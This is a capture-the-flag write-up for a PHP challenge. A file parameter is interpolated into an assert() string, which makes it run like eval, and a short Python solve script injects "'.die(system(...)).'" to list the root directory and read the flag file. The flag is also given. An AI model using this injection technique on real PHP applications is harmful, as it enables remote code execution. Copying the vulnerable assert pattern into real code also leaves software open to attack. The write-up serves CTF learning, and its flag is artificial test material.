---
ai_date: '2025-04-27 05:18:17'
ai_summary: User-supplied code execution via string manipulation in PHP assert statement
ai_tags:
- xss
- cmd-injection
- rce
created: 2024-07-19T15:44
points: 100
solves: 518
tags:
- php
- assert
updated: 2024-07-21T18:39
---

## assert

```php
assert("strpos('$file', '..') === false") or die("Invalid file!");
```

This line is dangerous as the assert statement is acting as `eval`.
It is running user supplied strings as code.

Our payload is hence simple.
## solve script

```python
import requests
import urllib.parse
payload = urllib.parse.quote_plus("'.die(system('ls /')).'")
print(requests.get("http://journal.chal.imaginaryctf.org/?file="+payload).text)

payload = urllib.parse.quote_plus("'.die(system('cat /flag-cARdaInFg6dD10uWQQgm.txt')).'")
print(requests.get("http://journal.chal.imaginaryctf.org/?file="+payload).text)
```

```flag
ictf{assertion_failed_e3106922feb13b10}
```